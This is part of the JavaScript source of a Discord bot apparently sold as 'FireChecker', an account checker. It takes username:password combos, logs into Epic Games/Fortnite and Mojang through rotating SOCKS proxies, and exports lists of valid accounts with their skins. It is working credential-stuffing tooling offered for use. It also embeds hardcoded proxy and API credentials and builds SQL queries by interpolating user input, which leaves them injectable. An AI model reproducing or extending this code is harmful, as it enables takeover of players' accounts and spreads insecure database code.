      setTimeout(function(){ manageproxies(proxy[0], "false") }, info.messageVars[0] * 1000);
      return comboCheckMethod(message, args);
    }

    if(info.errorCode) finalresults = {
      isError: true,
      error: 'Check failed!',
      errorDescription: info.errorMessage
    }
  } catch(e) {
      console.error(e); // error in the above string (in this case, yes)!
  }
  });

  return finalresults;
}

async function saveComboCheck(message, args)
{
  if(args.length < 1) return message.channel.send("No mass check ID given!");

  let conn1, results, results2;
  try {
      conn1 = await pool.getConnection();
      results = await conn1.query(`SELECT * FROM mass_checks WHERE id = '${args[0]}'`);
  

      if(!results[0]) return message.channel.send("Cannot find mass check with id: " + args[0]);
      
      if(results[0].userid != message.author.id) return message.channel.send("You can only save mass checks made by **you**!"); 

      var stream = fs.createWriteStream(`../downloads/mass-check-savedata-${message.author.id}.txt`);
      await stream.once('open', async function(fd) {

      results[0].checkIDs = results[0].checkIDs.split(",");
      
      await stream.write(`#################################################################################################
#                                                                   Mass-Check !!Alpha!!   	    #
#  ________________                           ________________            ______                #
#   ____  ____/__(_)___________                ___  ____/__  /_______________  /______________  #
#    __  /_   __  /__  ___/  _ \\   ________     _  /    __  __ \\  _ \\  ___/_  //_/  _ \\_  ___/  #
#    _  __/   _  / _  /   /  __/   _/_____/     / /___  _  / / /  __/ /__ _  ,<  /  __/  /      #
#    /_/      /_/  /_/    \\___/                 \\____/  /_/ /_/\\___/\\___/ /_/|_| \\___//_/       #
#                                                                                        	    #
#  Made by: ToS#3333 | Discord: https://discord.gg/zkm5gTS | The way it's meant to be checked!  #
#                                                                                        	    #
#################################################################################################`);

    stream.write(`\nValid Accounts - ${results[0].checkIDs.length}\n#########################################################################`);
      
    //console.log(typeof(results[0].checkIDs));
    
      results2 = await conn1.query(`SELECT * FROM checks WHERE massCheckID = '${results[0].id}'`);
      await conn1.end();
    
    
    for (n = 0; n < results2.length; n++)
    {
      let check = results2[n];
      //console.log(check);
      let ddata = await decrypt(check.credits, check.userid);
      let resultitems = JSON.parse(check.items);
      await stream.write(`\n${ddata} -> [ID: ${check.id}, Skins: ${resultitems.skins.length}]`);
    }

    stream.end();
    });
  } catch (err) { throw err; }

  stream.on("finish", async () => {
    console.log("Done!");
    await message.channel.send({
      files: [{
        attachment: `../downloads/mass-check-savedata-${message.author.id}.txt`,
        name: 'valid.txt'
      }]
    });
  
    await fs.unlink(`../downloads/mass-check-savedata-${message.author.id}.txt`, (err) => { if (err) throw err;} );
  });
  
}

// Testing Commands

async function openCMD(message, args)
{
  var proxy = await getRandomProxy();

  if(proxy.length == 0) return message.channel.send({embed: {
    color: 0xff0000,
    fields: [{
        name: `‼ Fatal Error ‼`,
        value: `Please report this to **ToS#3333**,\nas there aren\'t any available proxies!`
      }]
  }});

  var options1 = {
    url: `https://sessionserver.mojang.com/session/minecraft/profile/02b70141734f632f55a8cae27d2f6ed9`,
    method: 'GET',
    headers: {
      'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36",
      'Connect-Timeout': 5000,
      'content-type': 'application/json'
    },
    timeout: 5000,
    agent: agent
  };

  await request(options1).then( async function (body){
    var info2 = JSON.parse(body);
    console.log(info2);
  }).catch( async function (err) {
    console.log(err);
    //console.log(`${err.name} -> ${err.message}`);
  });
}

async function testCMD(message, args)
{
  if (!args[0]) return message.channel.send("No account details given!");

  var account = args[0].split(":");

  var proxy = await getRandomProxy();

  if(proxy.length == 0) return message.channel.send({embed: {
    color: 0xff0000,
    fields: [{
        name: `‼ Fatal Error ‼`,
        value: `Please report this to **ToS#3333**,\nas there aren\'t any available proxies!`
      }]
  }});

  var agent = new SocksProxyAgent({
    host: proxy[0].ip,
    port: proxy[0].port,
    protocol: 'socks:',
    auth: `${proxy[0].username}:XsKfHlNVIR`
  });

  let xsfrToken = null;
  let j = request.jar();
  await isWProxy(message, proxy);

  var options100 = {
    url: 'https://accounts.epicgames.com/login/doLauncherLogin?client_id=24a1bff3f90749efbfcbc576c626a282&redirectUrl=https%3A%2F%2Faccounts.launcher-website-prod07.ol.epicgames.com%2Flogin%2FshowPleaseWait%3Fclient_id%3D24a1bff3f90749efbfcbc576c626a282%26rememberEmail%3Dfalse',
    method: 'GET',
    headers: {

      'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) EpicGamesLauncher/9.6.1-4858958+++Portal+Release-Live UnrealEngine/4.21.0-4858958+++Portal+Release-Live Safari/537.36",
      'Content-Type': "application/x-www-form-urlencoded; charset=UTF-8"
    },
    jar: j,                            
    body: ``,
    //body: `grant_type=password&username=${account[0]}&password=${account[1]}&includePerms=true&token_type=eg1`,
    timeout: 5000,
    agent: agent
  };

  await request(options100).then( async function (body){
    //var info = JSON.parse(body);
    //console.log(info);
    let cookieJar = j.getCookieString("https://accounts.epicgames.com/login?lang=en_US&redirectUrl=https%3A%2F%2Fwww.epicgames.com%2Faccount%2F&client_id=007c0bfe154c4f5396648f013c641dcf&noHostRedirect=true");
    let findCookie = /XSRF-TOKEN=(.*);/gm;
    
    let cookie = findCookie.exec(cookieJar);
    console.log(xsfrToken);
    xsfrToken = cookie[1];
    console.log(xsfrToken);
  
    var options = {
      url: 'https://accounts.launcher-website-prod07.ol.epicgames.com/login/doLauncherLogin',
      method: 'POST',
      headers: {
        'Allow-Auto-Redirect': false,
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) EpicGamesLauncher/9.6.1-4858958+++Portal+Release-Live UnrealEngine/4.21.0-4858958+++Portal+Release-Live Safari/537.36",
        'X-XSRF-TOKEN': xsfrToken,
        'Content-Type': "application/x-www-form-urlencoded; charset=UTF-8"
      },
      jar: j,                            
      body: `fromForm=yes&authType=&linkExtAuth=&client_id=24a1bff3f90749efbfcbc576c626a282&redirectUrl=https%3A%2F%2Faccounts.launcher-website-prod07.ol.epicgames.com%2Flogin%2FshowPleaseWait%3Fclient_id%3D24a1bff3f90749efbfcbc576c626a282%26rememberEmail%3Dfalse&epic_username=${account[0]}&password=${account[1]}&rememberMe=YES`,
      //body: `grant_type=password&username=${account[0]}&password=${account[1]}&includePerms=true&token_type=eg1`,
      timeout: 5000,
      agent: agent
    };

    await request(options).then( async function (body){
      var info = JSON.parse(body);
      //console.log(info);
      
      var options2 = {
        url: info.redirectURL,
        method: 'GET',
        headers: {
          'Allow-Auto-Redirect': false,
          'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) EpicGamesLauncher/9.6.1-4858958+++Portal+Release-Live UnrealEngine/4.21.0-4858958+++Portal+Release-Live Safari/537.36",
          'X-XSRF-TOKEN': xsfrToken,
          'Content-Type': "application/x-www-form-urlencoded; charset=UTF-8"
        },
        jar: j,                            
        body: ``,
        //body: `grant_type=password&username=${account[0]}&password=${account[1]}&includePerms=true&token_type=eg1`,
        timeout: 5000,
        agent: agent
      };

      await request(options2).then( async function (body){
        //console.log(body);
        let regex = /com\.epicgames\.account\.web\.widgets\.loginWithExchangeCode\(\'(.*)\'\,/gm;
        let m = regex.exec(body);
        //console.log(m[1]);

        var options3 = {
          url: 'https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/token',
          method: 'POST',
          headers: {
            'User-Agent': "Fortnite/++Fortnite+Release-4.5-CL-4166199 Windows/6.2.9200.1.768.64bit",
            'Authorization': "basic ZWM2ODRiOGM2ODdmNDc5ZmFkZWEzY2IyYWQ4M2Y1YzY6ZTFmMzFjMjExZjI4NDEzMTg2MjYyZDM3YTEzZmM4NGQ=",
            'Keep-Alive': true,
            'Connect-Timeout': 5000,
            'Allow-Auto-Redirect': false,
            'content-type': 'application/x-www-form-urlencoded'
          },
          jar: j,
          body: `grant_type=exchange_code&exchange_code=${m[1]}&token_type=eg1`,
          timeout: 5000,
          agent: agent
        };
        await request(options3).then( async function (body){
          //console.log(body);
          var info = JSON.parse(body);
          console.log(info);
            
        });

      });
    });
  });

  /*var resultaccount = { // MINECRAFT - FAIL 
    credits: args[0],
    username: null,
    dataOfBirth: null,
    isBanned: false,
    isChild: false,
    isProtected: false,
    isVerified: false,
    isPremium: false,
    canBeMegrated: false
  }

  var options = {
    url: 'https://authserver.mojang.com/authenticate',
    method: 'POST',
    headers: {
      'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36",
      'Keep-Alive': true,
      'Connect-Timeout': 5000,
      'content-type': 'application/json'
    },
    body: `{"agent": { "name": "Minecraft", "version": 1}, "username": "${account[0]}", "password": "${account[1]}", "requestUser": true}`,
    timeout: 5000,
    agent: agent
  };

  await request(options).then( async function (body){
    var info = JSON.parse(body);
    console.log(info);
    return;  
    var options1 = {
      url: `https://sessionserver.mojang.com/session/minecraft/profile/${info.user.id}`,
      method: 'GET',
      headers: {
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36",
        'Connect-Timeout': 5000,
        'content-type': 'application/json'
      },
      body: `{}`,
      timeout: 5000,
      agent: agent
    };

    await request(options1).then( async function (body){
      var info2 = JSON.parse(body);
      console.log(info2);
    }).catch( async function (err) {
      console.log(err);
      //console.log(`${err.name} -> ${err.message}`);
    });

  }).catch( async function (err) {
    console.log(err);
    //console.log(`${err.name} -> ${err.message}`);
  });

  /*var proxy = await getRandomProxy();

  var agent = new SocksProxyAgent({
    host: proxy[0].ip,
    port: proxy[0].port,
    protocol: 'socks:',
    auth: `${proxy[0].username}:XsKfHlNVIR`
  });

  var options = {
    url: 'https://api.myip.com/',
    body: ``,
    agent: agent,
  };

  await request(options).then( async function (body){
    var info = JSON.parse(body);
    console.log(info.ip);
  }).catch( async function (err) {
    console.log(`${err.name} -> ${err.message}`);
    if(err.name == "RequestError") 
    {
      if(err.message == "Error: self signed certificate in certificate chain" || err.message == "Error: Proxy connection timed out")
      {
        let conn;
        try {
            conn = await pool.getConnection();
            await conn.query(`DELETE FROM proxies WHERE id = ?`, [proxy[0].id]);
            await conn.end();
        } catch (err) { throw err; }
      }
      //return testCMD(message, args);
    }
  });
  

  // create an instance of the `SocksProxyAgent` class with the proxy server information
  // NOTE: the `true` second argument! Means to use TLS encryption on the socket
  
 
  /*if(args.length != 2) return;
  var key = message.author.id;


  if(args[0] == "encode")
  {
    var enc = encrypt(args[1], key);

    message.reply(enc);
  }
  else if(args[0] == "decode")
  {
    var dec = decrypt(args[1], key);

    message.reply(dec);
  }*/

  //https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/6443e8692b1b4b02a8df813a0e254fb0/client/QueryProfile?profileId=collection_book_schematics0&rvn=-1
  //https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/${info.account_id}/client/QueryProfile?profileId=athena&rvn=-1
  /*if(args.length < 2) return;
  for(i = 1; i <= args[1]; i++)
  {
    checkCMD(message, args)
  }*/
}

async function reactCMD(message, args)
{
  for (i = 0; i < config.emojisReact.length; i++)
  {
    let emoji = message.guild.emojis.find(x => x.id == config.emojisReact[i]);
    await message.react(emoji);
  }
  
}

async function decryptCMD(message, args)
{
  console.log(args);
  if(args.length < 2) return;
  let result = await decrypt(args[0], args[1]);
  console.log(result);
}

// Adding things & Global

async function addProxies(message, args)
{
  let allowed = await isStaff(message);
  console.log(allowed);
  if(!allowed.hasAccess) return;
  if(allowed.result[0].access < 5) return;
  
  var attachment;
  if(message.attachments.first() == null)
  {
      let m = await message.reply("Send me the \`txt\` file! \n\n\Type \`cancel\` to exit or wait 60 seconds!");
      
      var filter = m => m.author.id == message.author.id;
      let respond = await message.channel.awaitMessages(filter, { max: 1, time: 60000, errors: ['time'] }).catch(error => console.error(error.title));

      if(respond.first().content.toLowerCase().startsWith("cancel"))
      {
          return m.delete().catch(console.error);
      }
      else attachment = await respond.first().attachments.first();  
  }
  else attachment = await message.attachments.first();

  var l = attachment.url.length;
  var lastChar = attachment.url.substring(l-3, l); 
  if (lastChar != "txt") { 
      return message.reply("I was expecting \`txt\` file.\nLets do it again...") && addProxies(message, args);
  }

  var download = await wget.download(attachment.url, `../downloads/proxy-${message.author.id}.txt`);
  let m = await message.reply("📥**Uploading...**");
  download.on('error', function(err) {
      console.log(err);
  });
  download.on('end', function(output) {
      console.log(output);
  });
  download.on('progress', async function(progress) {
      if(progress == 1) return setTimeout(addProxiesbyFile, 3000, message, args, m);
  });
}

async function addProxiesbyFile(message, args, mte)
{
    let addedaccs2 = 0;
    let failedaccs2 = 0;

    fs.readFile(`../downloads/proxy-${message.author.id}.txt`, 'utf8', async function (err,data) {
      if (err) {
        return console.log(err);
      }
        const regex = /([0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}):([0-9]*):([A-Za-z0-9]*)/gm;
        //const regex = /([0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}):([0-9]*)/gm;
        let m;

        while ((m = regex.exec(data)) !== null) {
            // This is necessary to avoid infinite loops with zero-width matches
            if (m.index === regex.lastIndex) {
                regex.lastIndex++;
            }
            
            // The result can be accessed through the `m`-variable.
            
            let conn;
            try {
                conn = await pool.getConnection();
                const res = await conn.query(`INSERT INTO proxies (ip, port, username) VALUES (?, ?, ?)`, [m[1], m[2], m[3]]);
                //console.log(res);
                if(res.affectedRows != 0) addedaccs2++;
                else failedaccs2++;
                //console.log(addedaccs2 + " | " + failedaccs2);
                await conn.end();
            } catch (err) { throw err; }
        }
        console.log(`Added ${addedaccs2} proxies`);
        await mte.edit(`Successfully added **${addedaccs2} proxies**!`);
    });
    fs.unlink(`../downloads/proxy-${message.author.id}.txt`, (err) => { if (err) throw err;} );
}

async function addItemsCMD(message, args)
{
  let allowed = await isStaff(message);
  if(!allowed.hasAccess) return;

  var attachment;
  if(message.attachments.first() == null)
  {
      let m = await message.reply("Send me the \`txt\` or \`csv\` file! \n\n\Type \`cancel\` to exit or wait 60 seconds!");
      
      var filter = m => m.author.id == message.author.id;
      let respond = await message.channel.awaitMessages(filter, { max: 1, time: 60000, errors: ['time'] }).catch(error => console.error(error.title));

      if(respond.first().content.toLowerCase().startsWith("cancel"))
      {
          return m.delete().catch(console.error);
      }
      else attachment = await respond.first().attachments.first();  
  }
  else attachment = await message.attachments.first();

  var l = attachment.url.length;
  var lastChar = attachment.url.substring(l-3, l); 
  if (lastChar != "txt" && lastChar != "cssv") { 
      return message.reply("I was expecting \`txt\` or \`csv\` file.\nLets do it again...") && addItemsCMD(message, args);
  }

  var download = await wget.download(attachment.url, `../downloads/items-${message.author.id}.txt`);
  let m = await message.reply("📥**Uploading...**");
  download.on('error', function(err) {
      console.log(err);
  });
  download.on('end', function(output) {
      console.log(output);
  });
  download.on('progress', async function(progress) {
      if(progress == 1) return setTimeout(addItemsbyFile, 3000, message, args, m);
  });
}

async function addItemsbyFile(message, args, mte)
{
  let addedaccs2 = 0;
    let failedaccs2 = 0;

    fs.readFile(`../downloads/items-${message.author.id}.txt`, 'utf8', async function (err,data) {
      if (err) {
        return console.log(err);
      }
        const regex = /([a-z]*);(.*([0-9]{3}).*);(.*)/gm;
        const regex2 = /(.*);([a-z_]*);(.*)/gm;
        let m;

        while ((m = regex.exec(data)) !== null) {
            // This is necessary to avoid infinite loops with zero-width matches
            if (m.index === regex.lastIndex) {
                regex.lastIndex++;
            }
            
            // The result can be accessed through the `m`-variable.
            var string = null;  
          
            switch (m[1])
            {
              case "backpacks":
                string = "INSERT INTO backpacks (bid, fullid, name) VALUES (?, ?, ?)";
              break;

              case "gliders":
                string = "INSERT INTO gliders (gid, fullid, name) VALUES (?, ?, ?)";
              break;

              case "pickaxes":
                string = "INSERT INTO pickaxes (pid, fullid, name) VALUES (?, ?, ?)";
              break;

              case "skins":
                string = "INSERT INTO skins (cid, fullid, name) VALUES (?, ?, ?)";
              break; 

              case "dances":
                string = "INSERT INTO dances (eid, fullid, name) VALUES (?, ?, ?)";
              break; 
            }

            let conn;
            try {
                conn = await pool.getConnection();
                const res = await conn.query(string, [m[3], m[2], m[4]]);
                //console.log(res);
                if(res.affectedRows != 0) addedaccs2++;
                else failedaccs2++;
                //console.log(addedaccs2 + " | " + failedaccs2);
                await conn.end();
            } catch (err) { throw err; }
        }

        while ((m = regex2.exec(data)) !== null) {
          // This is necessary to avoid infinite loops with zero-width matches
          if (m.index === regex2.lastIndex) {
              regex2.lastIndex++;
          }
          
          // The result can be accessed through the `m`-variable.
          var string = null;  
          
          switch (m[1])
          {
            case "backpacks":
              string = "INSERT INTO backpacks (bid, fullid, name) VALUES (?, ?, ?)";
            break;

            case "gliders":
              string = "INSERT INTO gliders (gid, fullid, name) VALUES (?, ?, ?)";
            break;

            case "pickaxes":
              string = "INSERT INTO pickaxes (pid, fullid, name) VALUES (?, ?, ?)";
            break;

            case "skins":
              string = "INSERT INTO skins (cid, fullid, name) VALUES (?, ?, ?)";
            break; 

            case "dances":
              string = "INSERT INTO dances (eid, fullid, name) VALUES (?, ?, ?)";
            break; 
          }

          let conn;
          try {
              conn = await pool.getConnection();
              const res = await conn.query(string, [null, m[2], m[3]]);
              //console.log(res);
              if(res.affectedRows != 0) addedaccs2++;
              else failedaccs2++;
              //console.log(addedaccs2 + " | " + failedaccs2);
              await conn.end();
          } catch (err) { throw err; }
      }
        console.log(`Added ${addedaccs2} items`);
        await mte.edit(`Successfully added **${addedaccs2} items**!`);
    });
    fs.unlink(`../downloads/items-${message.author.id}.txt`, (err) => { if (err) throw err;} );
}

async function pingCMD(message)
{
    if(message.guild) message.delete().catch(console.error);
    const m = await message.channel.send("Ping?");
    m.edit(`**Pong!** Generation Latency is **${m.createdTimestamp - message.createdTimestamp}ms**. and Discord.JS API Latency is **${Math.round(client.ping)}ms**`);
}

async function fakeProxyBanCMD(message, args)
{
  let allowed = await isStaff(message);
  if(!allowed.hasAccess) return;
  if(allowed.result[0].access < 5) return;

  if(args.length < 1) return;
  if(!isNaN(args[0])) return;

  let proxy = await getRandomProxy();

  //console.log(proxy);

  manageproxies(proxy[0], "true", 100 * 1000);
  setTimeout(function(){ manageproxies(proxy[0], "false") }, 100 * 1000);
  //console.log(`Proxy state changed to: ${args[0]}`)
}

async function itmesapiCMD(message, args)
{
  let conn, res;
  try {
      conn = await pool.getConnection();
      res = await conn.query(`SELECT * FROM skins`);
  

  res.forEach(async item => {

    var options1 = {
      url: `https://fnbr.co/api/images?search=${item.name}&type=outfit`,
      method: 'GET',
      headers: {
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36",
        'x-api-key': "f6e49d07-870a-49bd-89b7-45291efff6c2"
      }
    };
  
    await request(options1).then( async function (body){
      var info = JSON.parse(body);
      //console.log(`${item.name} -> ${info.status}`);
      //console.log(`${info.data.length} -> ${item.name}`);
      console.log(`${info.data[0].name} | ${info.data[0].rarity} | ${info.data[0].price}`);

      await conn.query(`UPDATE skins SET rarity=?,description=?,priceType=?,price=?,icon=?,lastChecked=? WHERE dbid = ?`, [info.data[0].rarity, info.data[0].description, info.data[0].priceIcon, info.data[0].price, info.data[0].images.icon, new Date(), item.dbid]);

    }).catch( async function (err) {
      console.log(err);
      //console.log(`${err.name} -> ${err.message}`);
    });
  });

  await conn.end();
} catch (err) { throw err; }
}

async function skinCMD(message, args)
{
  if(args.length == 0) return message.channel.send({embed: {
    color: 0xFF0000,
    fields: [
      {
        name: `**Error**`,
        value: `Type the skin name!`
      }
    ]
  }});

  let skinname = await fallargs(args, 0);

  let conn, res;
  try {
      conn = await pool.getConnection();
      res = await conn.query(`SELECT * FROM skins WHERE name = ?`, [skinname]);
      await conn.end();
  } catch (err) { throw err; }

  if(res.length == 0) return message.channel.send({embed: {
    color: 0xFF0000,
    fields: [
      {
        name: `**Error**`,
        value: `No skin found with the following name \`${args[0]}\``
      }
    ]
  }});

  await message.channel.send({embed: {
    color: 0x00FF00,
    thumbnail: {
      url: res[0].icon
    },
    fields: [
      {
        name: `${res[0].name}`,
        value: `*${res[0].description}*`
      },
      {
        name: res[0].priceType != 0 ? `${config.priceTypes[res[0].priceType]} ${res[0].price}` : `Not Available!`,
        value: "** **",
        inline: true
      },
      {
        name: `${config.rarities[res[0].rarity]} ${res[0].rarity.replace(/^(.)|\s(.)/g, ($1) => $1.toUpperCase())}`,
        value: `** **`,
        inline: true
      }
    ]
  }});
}

client.on("ready", async () => {
    console.log(`I'm alive!`);
    deleteAtMidnight();
    loadConfig();
    //client.user.setActivity(`!gen <service>`, { type: 'PLAYING' });
});

client.on("guildMemberAdd", async (member) => {
  //console.log("Works!");
  if(member.guild.id != config.newServer) return;
  //console.log("Works!2");
  let conn, res;
  try {
      conn = await pool.getConnection();
      res = await conn.query(`SELECT * FROM users WHERE userID = ?`, [member.user.id]);
      await conn.end();
  } catch (err) { throw err; }
  console.log("Works!3");
  if(res.length > 0)
  {
    switch (res[0].access)
    {
      case 2:
        await member.addRoles(['538044769440366593', config.newCustomerRole, config.newPlatinumRole]);
        await member.user.send({embed: {
          color: 0xFFFFFF,
          fields: [
            {
              name: `Plan detected!`,
              value: `I have detected that you have **Platinum Early Customers** plan!`
            }
          ]
        }});
        break;
      case 1:
        await member.addRoles(['538044769440366593', config.newCustomerRole]);
        await member.user.send({embed: {
          color: 0xFFFFFF,
          fields: [
            {
              name: `Plan detected!`,
              value: `I have detected that you have **Customers** plan!`
            }
          ]
        }});
        break;
    }
  }
  else
  {
    /*await member.user.send({embed: {
      color: 0xff0000,
      fields: [
        {
          name: `No Plan detected!`,
          value: `You have been kicked from FireChecker\nbecase the server is only plans at the moment!`
        }
      ]
    }});
    await member.kick("The server is Plans only at the moment!");*/
    //await member.addRole('538044769440366593');
  }
});

client.on("message", async message => {   
    if(message.author.bot) return;
    //console.log(message.content.startsWith(config.staffprefix));

    if(message.content.startsWith(prefix))
    {
        let allowed = await isStaff(message);

        if(config.maintenance && !allowed.hasAccess)
        {
          if(message.guild)await message.delete();
          let m = await message.channel.send({embed: {
            color: 0xf1c40f,
            fields: [{
                name: `⚠️ Under Maintenance ⚠️`,
                value: `Sorry ${message.author} but Maintenance mode is enabled!\nPlease come back later...`
              }]
          }});
          return setTimeout(function(){ m.delete() }, 5000);
        }
        const wonlines = message.content.replace(/\r?\n|\r/g, " ");
        const args = wonlines.substring(prefix.length).split(" ");
        const command = args.shift().toLowerCase();

        customerCommands(message, command, args);
    }
    else if(message.content.startsWith(config.staffprefix))
    {
      let allowed = await isStaff(message);

      if(config.maintenance && !allowed.hasAccess)
      {
        if(message.guild)await message.delete();
        let m = await message.channel.send({embed: {
          color: 0xf1c40f,
          fields: [{
              name: `⚠️ Under Maintenance ⚠️`,
              value: `Sorry ${message.author} but Maintenance mode is enabled!\nPlease come back later...`
            }]
        }});
        return setTimeout(function(){ m.delete() }, 5000);
      }

        const wonlines = message.content.replace(/\r?\n|\r/g, " ");
        const args = wonlines.substring(prefix.length).split(" ");
        const command = args.shift().toLowerCase();

        //staffCommands(message, command, args);
    }
    else return;
});

const events = {
	MESSAGE_REACTION_ADD: 'messageReactionAdd',
	MESSAGE_REACTION_REMOVE: 'messageReactionRemove',
};

client.on('raw', async event => {
  if (!events.hasOwnProperty(event.t)) return;
  
	const { d: data } = event;
	const user = client.users.get(data.user_id);
	const channel = client.channels.get(data.channel_id) || await user.createDM();

	if (channel.messages.has(data.message_id)) return;

	const message = await channel.fetchMessage(data.message_id);
	const emojiKey = (data.emoji.id) ? `${data.emoji.name}:${data.emoji.id}` : data.emoji.name;
	const reaction = message.reactions.get(emojiKey);
	client.emit(events[event.t], reaction, user);
});

client.on("messageReactionAdd", async (messageReaction, user) => {

  if(user.bot) return;
  //console.log(messageReaction.emoji.name);
  
  if(messageReaction.emoji.name != "🆚" &&
     messageReaction.emoji.name != "⛏" &&
     messageReaction.emoji.name != "☂" &&
     messageReaction.emoji.name != "👜" &&
     messageReaction.emoji.name != "🙍") return;

  let conn, results;
  try {
      conn = await pool.getConnection();
      results = await conn.query(`SELECT * FROM checks WHERE messageID = '${messageReaction.message.id}'`);
      await conn.end();
  } catch (err) { throw err; }

  let mtoEdit = messageReaction.message;
});

function customerCommands(message, command, args)
{
    switch (command)
    {
        //User commands
        case "ping":
          return pingCMD(message);

        case "check":
          return checkCMD(message, args, null);

        case "items":
          return itemsCMD(message, args);

        case "stats":
          return statsCMD(message, args);

        case "skin":
          return skinCMD(message, args);

        case "save": // Under Development
          return saveCMD(message, args);
        
        //ToS's Commands
        case "test":
          return testCMD(message, args);

        case "open":
          return openCMD(message, args);

        case "abcdefgmass":
          return comboCheckCMD(message, args);

        case "abcdefgsavemass":
          return saveComboCheck(message, args);

        case "abcdefgdecrypt":
          return decryptCMD(message, args);

        case "react":
          return reactCMD(message, args);

        case "fakeproxyban":
          return fakeProxyBanCMD(message, args); 

        case "fakedelete":
          return message.reply("Don't you dare yourself! <a:loading:515585176273944587>");
          //return deleteChecks();

        case "featureitemsfromapi":
          return itmesapiCMD(message, args); 

        //Perma

        case "addproxies":
          return addProxies(message, args);

        case "additems":
          return addItemsCMD(message, args);
    }
}

function staffCommands(message, command, args)
{
    switch (command)
    {

    }
}

client.login(config.token);
